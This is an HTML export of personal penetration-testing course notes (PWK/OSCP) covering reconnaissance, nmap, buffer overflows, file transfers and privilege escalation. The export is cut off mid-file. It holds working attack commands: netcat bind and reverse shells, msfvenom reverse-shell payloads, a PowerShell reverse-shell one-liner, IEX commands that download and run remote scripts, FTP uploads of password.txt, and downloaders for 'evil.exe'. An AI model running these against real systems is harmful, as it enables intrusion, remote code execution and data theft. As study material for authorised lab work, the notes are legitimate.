<!doctype html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><title>My Notes</title><meta name="generator" content="CherryTree"></head><body><span style="font-family: Sans; font-size:16pt"><br>#Start SSH<br><br>root@kali:~/Documents/pwk# systemctl start ssh<br>root@kali:~/Documents/pwk# systemctl status ssh<br><br>#Verify that a service is running and listening on a specific port<br><br>root@kali:~/Documents/pwk# netstat -antp | grep sshd<br><br>#Enable ssh on startup if OS<br><br>root@kali:~/Documents/pwk# systemctl enable ssh<br><br>#wget command <br><br>wget www.cisco.com<br><br><b><span style="font-size:xx-large;">2. - The Essential Tools</span></b><br><br>#Netcat - Remote Administration,  TCPClient &amp; TCPServer Listening on a TCP/UDP Port<br><br>#TCPClient <br><br>nc -nv 10.0.0.22 110 -  check if a port is open or closed.<br><br>nc -nv 10.11.16.86 4445 - connect to network service<br><br>nc -nv 10.11.16.86 4445 &lt; /usr/share/windows-binaries/wget.exe<br><br><br>root@kali:~# ncat -v 10.0.0.22 4444 --ssl<br><br>#TCPServer <br><br>nc -nlvp 4445<br><br>nc -nlvp 4444 &gt; wget.exe #Transferring Files with Netcat<br><br><br>nc -nlvp 4444 -e cmd.exe #Bind Shell / CMD to port 4444<br> <br>nc -nlvp 4445 #Reverse Shell <br><br>nc -nv 10.11.16.86 4445 -e /bin/bash<br><br>#Ncat - more secure read/write &amp; bind shell<br><br>ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl<br><br><span style="text-decoration:underline;">Tcpdump</span><br><a href="https://hackertarget.com/tcpdump-examples/">https://hackertarget.com/tcpdump-examples/</a><br><br>#Tcpdump - read from file<br><br>#filter for source IP <br>tcpdump -n src host 172.16.40.10 -r /root/hashes/password_cracking_filtered.pcap<br><br>#filter for destination IP <br>tcpdump -n dst host 172.16.40.10 -r /root/hashes/password_cracking_filtered.pcap<br><br>#filter for port 81 <br>tcpdump -n port 81 -r /root/hashes/password_cracking_filtered.pcap<br><br>#dump in hex format<br>tcpdump -nX -r  /root/hashes/password_cracking_filtered.pcap<br><br>#display packets with PSH &amp; ACK flags turned on <br>tcpdump -A -n 'tcp[13] = 24' -r /root/hashes/password_cracking_filtered.pcap<br><br>#Tcpdump - live capture<br><br>#Monitor all packets on eth1 interface<br>tcpdump -i eth1<br><br>#Monitor all traffic on port 80 ( HTTP )<br>tcpdump -i eth1 'port 80'<br><br>#Monitor all traffic on port 25 ( SMTP )<br>tcpdump -vv -x -X -s 1500 -i eth1 'port 25'<br><br>#verify command execution by monitoring ping command<br>tcpdump -i &lt;tun0&gt; icmp  //only tcp packets<br><br><br><br><b><span style="font-size:xx-large;">3. - Passive Information Gathering</span></b><br><br>#Google dork -  <a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a><br><br>site:microsoft.com -site:www.microsoft.com<br><br>inurl:.php? intext:CHARACTER_SETS,COLLATIONS intitle:phpmyadmin<br><br>filetype:pdf inurl:php? and intitle:admin<br><br>#TheHarvester <br>#theharvester -d msn.com -b google &gt; /root/Documents/pwk/exercises/google.txt <br><br>#whois <br><br>whois example.com<br><br>whois 50.7.67.186<br><br><b><span style="font-size:xx-large;">4. - Active Information Gathering</span></b><br><br>#Find dns of example.com <br><br>host -t ns example.com<br><br>#attempt a zone transfer for  zone transfer  from example<br>host -l exmaple.com ns.example.com<br><br>#DNSRecon - resolve ns and attempt a zone transfer for megacorpone.com <br><br>dnsrecon -d megacorpone.com -t axfr <br><br>#Dnsenaum - resolve ns and attempt a zone transfer for zonetransfer.me<br><br>dnsenum zonetransfer.me<br><br>#TCP CONNECT / SYN Scanning<br><br>nc -nvv -w 1 -z 10.0.0.19 3388-3390<br><br>#4.2.2 - UDP Scanning<br><br>nc -nv -u -z -w 1 10.0.0.19 160-162<br><br>#IPTables - monitor the amount of traffic sent to a specific host<br> iptables -I INPUT 1 -s 10.0.0.19 -j ACCEPT<br> iptables -I OUTPUT 1 -d 10.0.0.19 -j ACCEPT<br> iptables -Z<br><br>#View traffic after running nmap or other service <br><br>iptables -vn -L<br><br>Nmap  <br><br><b>“As a general rule I always do a full port scan against every box. <br>You just never know when you'll find a non-standard RHP with a service running. <br>There are life scenarios when this is not appropriate, but in the offsec labs its fine.”</b><br><br>#full scan<br>nmap -v -p- -oA nmap/full 10.11.1.49<br><br>#Nmap full scan Windows<br>nmap -p- 10.10.10.52 -T4<br># Quick nmap scap for the top 20 ports<br><br>nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt<br><br>#SMB OS Discovery<br>nmap 10.0.0.19 --script smb-os-discovery.nse<br><br>#nmap sweeps are very useful for common services and ports enum<br><br>#example sweep across port 80 on the network  <br><br>nmap -p 80 10.11.1.1-254 -oG web-sweep.txt<br><br># grep output <br><br>grep open web-sweep.txt |cut -d" " -f2<br><br>#bash one liner to find smb service for all UP hosts across the network.<br><br>host=`grep open web-sweep.txt | cut -d" " -f2` | for ip in $host;do nmap $ip --script smb-os-discovery.nse;  done<br><br><br><br>#NMAP Scripts<br><br>#nmap run vul and safe scripts on a port. -Pn do not ping<br>nmap -p 445 --script "vuln and safe" -Pn -n <br><br>#Output all NMAP Scripts<br><br>grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"' | sort -u <br><br># nmap scan smb port 139,445<br><br>nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254<br><br># nbtscan another tool used for SMB NetBIOS services<br>dashboard/robot.txt<br>nbtscan -r 10.11.1.0/24<br><br>#Smb share running Windows for SMB vuln. <br><br>nmap -v -p 139,445 --script=smb-vuln-ms*.nse --script-args=unsafe1 &lt;target&gt;<br><br>#nmap cheet sheet<br><a href="https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/">https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/</a><br><br>nmap -sV 10.10.10.165<br><br>#check if port 80, 21 to 25 are open on IP 127.0.0.1<br>nmap  127.0.0.1 -p 80,21-25<br><br># -sC defaults scripts, -sV service enumartion, -oA output all formats, -vvv show what ports are open as soon as it finds out<br> nmap -sC -sV -oA nmap/initial -vvv  [ip_address]<br> <br>#Intense Slow Scan   <br>nmap -v -sS -A -Pn -T5 -p- [ip_address]<br><br>#Quick UDP Scan <br>nmap -v -sU -T5 [ip_address]<br><br>#full UDP scan<br>sudo nmap -v -sU -T5 -p-  [ip_address]<br><br>#-T4 for faster execution <br>nmap -sV -T4 -A -vvv [ip_address]<br><br>#nmap shell shock script <br>nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls &lt;target&gt;<br><br><br><b><span style="font-size:xx-large;">4.5.2 - Scanning for SNMP</span></b><br><br>nmap -sU --open -p 161 10.11.1.1-254 -oG mega-snmp.txt<br><br>Alternatively, we can use a tool such as onesixtyone40<br><br>echo public &gt; community<br>echo private &gt;&gt; community<br>echo manager &gt;&gt; community<br>for ip in $(seq 1 254);do echo 10.11.1.$ip;done &gt; ips<br>onesixtyone -c community -i ips<br><br>#Enumerating the Entire MIB Tree<br>snmpwalk -c public -v1 10.11.1.22<br><br>#Enumerating Windows Users:<br>snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25<br><br>#Enumerating Running Windows Processes:<br>snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2<br><br>#Enumerating Open TCP Ports:<br>snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3<br><br>#Enumerating Installed Software:<br>snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2<br><br><b><span style="font-size:xx-large;">5.1 - Vulnerability Scanning with Nmap</span></b><br><br>#Locatation of NSE scripts - /usr/share/nmap/scripts/<br><br>#scan a Cold Fusion web server for a directory traversal vulnerability<br>nmap -v -p 80 --script=http-vuln-cve2010-2861 &lt;target&gt;<br><br>#Openvans<br>#Job for openvas-scanner.service failed because a timeout was exceeded.<br>See "systemctl status openvas-scanner.service" and "journalctl -xe" for details.<br><br>#bash oneliner - greenbone-security-assistant openvas-scanner openvas-manager<br><br>#start all three services <br>for i in greenbone-security-assistant openvas-scanner openvas-manager; do systemctl start $i; done<br><br>#check status of services <br>for i in greenbone-security-assistant openvas-scanner openvas-manager; do systemctl status $i; done<br><br><b><span style="font-size:xx-large;">6 Buffer Overflows ESP:<br>(Extended Stack Pointer) vs EIP ( Extended Instruction Pointer )</span></b><br><br>EIP is a register that points to the next instruction...It simply points to the address in which that instruction is placed...<br>So if we overwrite this we can change the direction flow of the program and make it do what we want....<br><br>• If we can overwrite EIP we are the main controller of the program.<br>• EIP would redirect execution flow to ESP, with the ESP holding contents of shellcode. <br><br><br><b><span style="font-size:xx-large;">7 - Windows Buffer Overflows Exploitation </span></b><br><br><span style="text-decoration:underline;">Win 32 / x86</span><br>The x86 architecture stores addresses in little endian format, <br>where the low-order byte of the number is stored in memory<br>at the lowest address, and the high-order byte at the highest address<br><a href="https://searchnetworking.techtarget.com/definition/big-endian-and-little-endian">https://searchnetworking.techtarget.com/definition/big-endian-and-little-endian</a><br><br>To quickly go from a 32bit hex address in big endian to little endian without manually reversing it: struct.pack('&lt;I', 0x08134597)<br><br>Here is a shortcut not shown in the video to generate the list of chars: print ''.join(r'\x{0:02x}'.format(x) for x in range(1,256))<br><br>“-e” - encode shellcode . "-b' - specific bad characters we wish to avoid<br><br>#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"<br><br><span style="text-decoration:underline;">ExitThread vs ExitProcess</span><br><br>ExitProcess - MSF default exit method will kill the service completely. <br><br>If the program is a threaded application, we can avoid crashing completely<br>by using the ExitThread method. <br><br>ExitThread - will terminate the affected thread, without disrupting the <br>usaul operations of the application. It will exit withouth killing the service completely.<br><br>#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"<br><br>USE  - No Operation (NOP) instructions (0x90), to avoid overwriting the first few bytes of shellcode.<br>#buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode<br><br><span style="text-decoration:underline;">Immunity Debugger</span><br><br>Immunity Debugger script, mona.py. This script will<br>help us identify modules in memory that we can search for<br><br># generate module info table<br>!mona modules  <br><br>#search for opcode in all sections of module<br>!mona find -s ''\xff\xe4'' -m &lt;module&gt;<br><br><b><span style="font-size:xx-large;">8. - Linux Buffer Overflow Exploitation</span></b><br><br>#send binary to dubugger<br>edb --run &lt;binary&gt;<br><br><span style="text-decoration:underline;">Cannot increase buffer length method:</span><br>Use the few bytes to write first stage shellcode to<br>(1) align EAX register to redirect to our A's buffer.<br>(2) jump to the EAS register<br><br>Jump to ESP<br><br>R<span style="text-decoration:underline;">eturn to libc method: </span><br>#Bruteforcing ASLR works on programs that can crash as many times as possible. <br>#This method does not work on programs that crash without a second attempt<br><br><b><span style="font-size:xx-large;">9 - Public Exploits - Never run an exploit <br>without reviewing its sourcecode/innerworkings.</span></b><br><br>(PoC) Proof of Concept - source code that can be used to demonstrate the bug/vulnerablity.<br><br>Vouched Sources:<br><br><a href="https://www.securityfocus.com/">https://www.securityfocus.com/</a><br><br><a href="https://www.exploit-db.com">https://www.exploit-db.com</a><br><br>White Papers - good resource for new research<br><a href="https://www.exploit-db.com/papers">https://www.exploit-db.com/papers</a><br><br>"CVE is a list of information security vulnerabilities and exposures <br>that aims to provide common names for publicly known problems. <br>The goal of CVE is to make it easier to share data across separate <br>vulnerability capabilities (tools, repositories, and services) <br>with this "common enumeration."<br><br><a href="https://cve.mitre.org/">https://cve.mitre.org/</a><br><br>Tools on Kali:<br><br>Kali contains a local version of Exploit-DB, a database that contains various exploits, code, and publications. <br><br>#searchsploit  search through exploits and shellcodes using terms from Exploit-DB #-m to mirror file<br>#searchsploit -m &lt;target&gt;<br><br>searchsploit -m exploits/linux/remote/40064.txt <br><br># -x, --examine the contents of file, 40616.c<br>searchsploit -x /usr/share/exploitdb/exploits/linux/local/40616.c<br><br>#search for privilege escalation exploits &amp; grep for linux kernel 2.6<br><br>searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6<br><br><span style="text-decoration:underline;">Fixing Public Exploits:</span><br><br>Simple Rules to Live by:<br><br>1. Always review sourcecode to understand the innerworkings of the public code. <br>2. Account for modification of the code to get it to a working condition. <br><br>How should it be compiled? gcc or windows target, etc?<br>Account for shellcode. Would it match our envrioment. <br><br>Buffer overflows. Would the address match our envrioment? <br>Is the address of JMP ESP, for example, correct? <br><br><br><b><span style="font-size:xx-large;">10 - File Transfers</span></b><br><br>“The term post exploitation refers to the actions performed by an attacker, once some level<br>of control has been gained on his target. This may include uploading files and tools to<br>the target machine, elevating privileges, expanding control into additional machines,<br>installing backdoors, cleaning up evidence of the attack, etc...<br><br>...Antivirus companies create databases of signatures for known malicious files. Once a<br>file with a known signature is found, it is usually quarantined by the antivirus software,<br>and rendered useless. Even worse, the incident containing information about the<br>affected file may alert diligent administrators to our presence”<br>(PWK guide, 2020)<br><br><span style="text-decoration:underline;">File Transfer Methods</span><br><br>Windows operating systems up to Windows XP and 2003 contain a TFTP client, by default<br>Linux os, wget, curl and python.<br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td><span style="color:#0088ff;font-weight:400">#Updated&nbsp;Windows&nbsp;File&nbsp;Transfer&nbsp;Methods</span><br>https<span style="color:#ff9d00;font-weight:700">://</span>medium.com<span style="color:#ff9d00;font-weight:700">/</span>@PenTest_duck<span style="color:#ff9d00;font-weight:700">/</span><span style="color:#ffee80;font-weight:400">almost-all-the-ways-to-file-transfer-1bd6bf710d65</span><br><br><span style="color:#3ad900;font-weight:400">"the&nbsp;most&nbsp;reliable&nbsp;across&nbsp;Windows&nbsp;editions."</span><br>certutil&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>urlcache&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>split&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>f&nbsp;<span style="color:#3ad900;font-weight:400">"http://&lt;rhost&gt;/nc64.exe"</span>&nbsp;nc.exe<br>&nbsp;<br>powershell&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>c&nbsp;<span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span>&nbsp;Net.WebClient).DownloadFile(<span style="color:#cccccc;font-weight:400">'http://&lt;rhost&gt;/nc64.exe'</span>,&nbsp;<span style="color:#cccccc;font-weight:400">'nc64.exe'</span>)<br><br>powershell&nbsp;<span style="color:#3ad900;font-weight:400">"IEX(New-Object&nbsp;Net.WebClient).downloadString('http://&lt;rhost&gt;evil-code.ps1')"</span><br><br>powershell&nbsp;“wget&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span><span style="color:#cccccc;font-weight:400">10.10</span>.<span style="color:#cccccc;font-weight:400">14.30</span><span style="color:#ff9d00;font-weight:700">/</span>nc64.exe&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>OutFile&nbsp;nc64.exe”<br><br><span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;open&nbsp;<span style="color:#cccccc;font-weight:400">10.10</span>.<span style="color:#cccccc;font-weight:400">14.30</span>&nbsp;&gt;&nbsp;ftp.txt<br><span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;ascii&nbsp;&gt;&gt;&nbsp;ftp.txt<br><span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;PUT&nbsp;password.txt&nbsp;&gt;&gt;&nbsp;ftp.txt<br><span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;bye&nbsp;&gt;&gt;&nbsp;ftp.txt<br><br>ftp&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>v&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>n&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>s<span style="color:#ff9d00;font-weight:700">:</span>ftp.txt&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>A&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;ftp&nbsp;command&nbsp;from&nbsp;file</span><br><br><span style="color:#0088ff;font-weight:400">#web&nbsp;shell&nbsp;to&nbsp;reverse&nbsp;shell</span><br>c<span style="color:#ff9d00;font-weight:700">:\</span>windows<span style="color:#ff9d00;font-weight:700">\</span>system32<span style="color:#ff9d00;font-weight:700">\</span>cmd.exe&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>c&nbsp;powershell&nbsp;<span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span>&nbsp;Net.Webclient).downloadString(<span style="color:#cccccc;font-weight:400">'http://&lt;rhost&gt;:80/Invoke-Tcp2.ps1'</span>)</td></tr></table><br><br><br><span style="color:#ffa500;">FTP non-interactively:</span><br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td>C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>Sample&gt;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;open&nbsp;<span style="color:#cccccc;font-weight:400">10.11</span>.<span style="color:#cccccc;font-weight:400">0.5</span>&nbsp;<span style="color:#cccccc;font-weight:400">21</span>&gt;&nbsp;ftp.txt<br>C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>Sample&gt;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;USER&nbsp;evils&gt;&gt;&nbsp;ftp.txt<br>C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>Sample&gt;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;ftp&gt;&gt;&nbsp;ftp.txt<br>C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>Sample&gt;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;bin&nbsp;&gt;&gt;&nbsp;ftp.txt<br>C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>Sample&gt;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;GET&nbsp;nc.exe&nbsp;&gt;&gt;&nbsp;ftp.txt<br>C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>Sample&gt;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;bye&nbsp;&gt;&gt;&nbsp;ftp.txt<br>C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>Sample&gt;ftp&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>v&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>n&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>s<span style="color:#ff9d00;font-weight:700">:</span>ftp.txt</td></tr></table><br><br><span style="color:#ffa500;text-decoration:underline;">Bypassing PowerShell execution policies</span><br><br>#Usage: powershell -ExecutionPolicy Bypass -File c:\Windows\temp\run.ps1<br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td><span style="color:#0088ff;font-weight:400">$secpasswd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">=</span>&nbsp;<span style="color:#ff9d00;font-weight:700">ConvertTo-SecureString</span>&nbsp;<span style="color:#3ad900;font-weight:400">"aliceishere"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>AsPlainText&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>Force<br><span style="color:#0088ff;font-weight:400">$mycreds</span>&nbsp;<span style="color:#ff9d00;font-weight:700">=</span>&nbsp;<span style="color:#ff9d00;font-weight:700">New-Object</span>&nbsp;System.Management.Automation.PSCredential&nbsp;(<span style="color:#3ad900;font-weight:400">"Administrator"</span>,<span style="color:#0088ff;font-weight:400">$secpasswd</span>)<br><span style="color:#0088ff;font-weight:400">$computer</span>&nbsp;<span style="color:#ff9d00;font-weight:700">=</span>&nbsp;<span style="color:#3ad900;font-weight:400">"DEV01"</span><br>[System.Diagnostics.<span style="color:#ff9d00;font-weight:700">Process</span>]<span style="color:#ff9d00;font-weight:700">::Start</span>(<span style="color:#3ad900;font-weight:400">"C:\Windows\temp\dabbb118.exe"</span>,<span style="color:#3ad900;font-weight:400">""</span>,<br><span style="color:#0088ff;font-weight:400">$mycreds</span>.Username,&nbsp;<span style="color:#0088ff;font-weight:400">$mycreds</span>.Password,&nbsp;<span style="color:#0088ff;font-weight:400">$computer</span>)</td></tr></table><br><br><span style="color:#ffa500;text-decoration:underline;">PowerShell reverse shell one-liner</span><br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td>powershell&nbsp;<span style="color:#ff9d00;font-weight:700">-</span>c&nbsp;<span style="color:#3ad900;font-weight:400">"$client&nbsp;=&nbsp;New-Object&nbsp;System.Net.Sockets.TCPClient('10.<br>11.0.4',443);$stream&nbsp;=&nbsp;$client.GetStream();[byte[]]$bytes&nbsp;=&nbsp;0..65535|%{0};while(($i&nbsp;=<br>$stream.Read($bytes,&nbsp;0,&nbsp;$bytes.Length))&nbsp;-ne&nbsp;0){;$data&nbsp;=&nbsp;(New-Object&nbsp;-TypeName&nbsp;System.T<br>ext.ASCIIEncoding).GetString($bytes,0,&nbsp;$i);$sendback&nbsp;=&nbsp;(iex&nbsp;$data&nbsp;2&gt;&amp;1&nbsp;|&nbsp;Out-String&nbsp;);<br>$sendback2&nbsp;=&nbsp;$sendback&nbsp;+&nbsp;'PS&nbsp;'&nbsp;+&nbsp;(pwd).Path&nbsp;+&nbsp;'&gt;&nbsp;';$sendbyte&nbsp;=&nbsp;([text.encoding]::ASCII<br>).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c<br>lient.Close()"</span></td></tr></table><br><br><span style="color:#ffa500;">Powershell : HTTP downloader</span> (New versions of windows)<br><br>#Usage: C:\Users\Sample&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile -File wget.ps1<br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td>echo&nbsp;$storageDir&nbsp;=&nbsp;$pwd&nbsp;&gt;&nbsp;wget.ps1<br>echo&nbsp;$webclient&nbsp;=&nbsp;New-<span style="color:#ff9d00;font-weight:700">Object</span>&nbsp;System.Net.WebClient&nbsp;&gt;&gt;wget.ps1<br>echo&nbsp;$url&nbsp;=&nbsp;"http:<span style="color:#0088ff;font-weight:400">//&lt;rhost&gt;/evil.exe"&nbsp;&gt;&gt;wget.ps1</span><br>echo&nbsp;$<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;=&nbsp;"evil.exe"&nbsp;&gt;&gt;wget.ps1<br>echo&nbsp;$webclient.DownloadFile($url,$<span style="color:#ff9d00;font-weight:700">file</span>)&nbsp;&gt;&gt;wget.ps1</td></tr></table><br><br><span style="color:#ffa500;">VBS script: HTTP downloader</span> (Legacy windows)<br><br>#Usage:  C:\Users\Sample&gt;cscript wget.vbs "http://10.11.0.165/evil.exe" evil.exe<br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td>echo&nbsp;strUrl&nbsp;=&nbsp;WScript.Arguments.Item(<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;&gt;&nbsp;wget.vbs<br>echo&nbsp;StrFile&nbsp;=&nbsp;WScript.Arguments.Item(<span style="color:#ff0044;font-weight:400">1</span>)&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;Const&nbsp;HTTPREQUEST_PROXYSETTING_DEFAULT&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;Const&nbsp;HTTPREQUEST_PROXYSETTING_PRECONFIG&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;Const&nbsp;HTTPREQUEST_PROXYSETTING_DIRECT&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;Const&nbsp;HTTPREQUEST_PROXYSETTING_PROXY&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">2</span>&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;Dim&nbsp;http,&nbsp;varByteArray,&nbsp;strData,&nbsp;strBuffer,&nbsp;lngCounter,&nbsp;fs,&nbsp;ts&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;Err.Clear&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;Set&nbsp;http&nbsp;=&nbsp;Nothing&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;Set&nbsp;http&nbsp;=&nbsp;CreateObject(<span style="color:#3ad900;font-weight:400">"WinHttp.WinHttpRequest.5.1"</span>)&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;If&nbsp;http&nbsp;Is&nbsp;Nothing&nbsp;Then&nbsp;Set&nbsp;http&nbsp;=&nbsp;CreateObject(<span style="color:#3ad900;font-weight:400">"WinHttp.WinHttpRequest"</span>)&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;If&nbsp;http&nbsp;Is&nbsp;Nothing&nbsp;Then&nbsp;Set&nbsp;http&nbsp;=&nbsp;CreateObject(<span style="color:#3ad900;font-weight:400">"MSXML2.ServerXMLHTTP"</span>)&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;If&nbsp;http&nbsp;Is&nbsp;Nothing&nbsp;Then&nbsp;Set&nbsp;http&nbsp;=&nbsp;CreateObject(<span style="color:#3ad900;font-weight:400">"Microsoft.XMLHTTP"</span>)&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;http.Open&nbsp;<span style="color:#3ad900;font-weight:400">"GET"</span>,&nbsp;strURL,&nbsp;False&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;http.Send&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;varByteArray&nbsp;=&nbsp;http.ResponseBody&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;Set&nbsp;http&nbsp;=&nbsp;Nothing&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;Set&nbsp;fs&nbsp;=&nbsp;CreateObject(<span style="color:#3ad900;font-weight:400">"Scripting.FileSystemObject"</span>)&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;Set&nbsp;ts&nbsp;=&nbsp;fs.CreateTextFile(StrFile,&nbsp;True)&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;strData&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;strBuffer&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;For&nbsp;lngCounter&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;to&nbsp;UBound(varByteArray)&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;ts.Write&nbsp;Chr(<span style="color:#ff0044;font-weight:400">255</span>&nbsp;And&nbsp;Ascb(Midb(varByteArray,lngCounter&nbsp;+&nbsp;<span style="color:#ff0044;font-weight:400">1</span>,&nbsp;<span style="color:#ff0044;font-weight:400">1</span>)))&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;Next&nbsp;&gt;&gt;&nbsp;wget.vbs<br>echo&nbsp;ts.Close&nbsp;&gt;&gt;&nbsp;wget.vbs</td></tr></table><br><br><b><span style="font-size:xx-large;">11. - Privilege Escalation - “Think Like a Network Administrator”</span></b><br><br>"Privilege escalation is the process of increasing the level of access to a machine, or<br>network. In most operating systems, and networked environments, the process of<br>privilege escalation is inherently prevented, in order to adhere to the user privilege<br>separation model. Therefore, by definition, the process of privilege escalation will<br>involve breaking this security model." (PWK guide, 2020)<br><br>"..Machine, most commonly exploiting a process or service with higher privileges.<br>If the exploitation is successful, our exploit payload will be executed with those higher<br>privileges."<br><br><span style="text-decoration:underline;">Privilege escalation techniques</span><br>1. Kernel exploits. <br>2. Exploiting services which are running as root / nt system<br>3. Exploiting SUID / admin Executables <br>4. Exploiting SUDO /admin rights/user <br>5. Exploiting badly configured cron jobs <br>6. Exploiting users with ‘.’ in their PATH (linux)<br>6.1 Exploiting DLL's/ writable PATH folders, etc (windows)<br><br>PyInstaller Quickstart - target windows with no python envrionment. <br><br>#create the stand-alone executable<br>python pyinstaller.py --onefile ms11-080.py<br><br>Install PyInstaller from PyPI:<br>pip install pyinstaller<br><br>Go to your program’s directory and run:<br>pyinstaller yourprogram.py<br><br><a href="https://www.pyinstaller.org/">https://www.pyinstaller.org/</a><br><br>#command to add users to rdp group<br>net localgroup “Remote Desktop users” &lt;user&gt; /add<br><br>Windows Weak Services: <br><br>Get nt/system when the service is restarted, or the machine is rebooted:<br><br>Incorrect File and Service Permissions. <br>Does the user have full read and write access to the file/binary?<br>If Yes,  we can replace file with a malicious one.<br><br>#complie with  i686-w64-mingw32-gcc useradd.c -o service.exe <br><br><table border="1" style="display:inline-table; font-family: Monospace; font-size:16pt"><tr><td><span style="color:#80ffbb;font-weight:700">#include&nbsp;&lt;stdlib.h&gt;</span>&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;system,&nbsp;NULL,&nbsp;EXIT_FAILURE&nbsp;*/</span><br><span 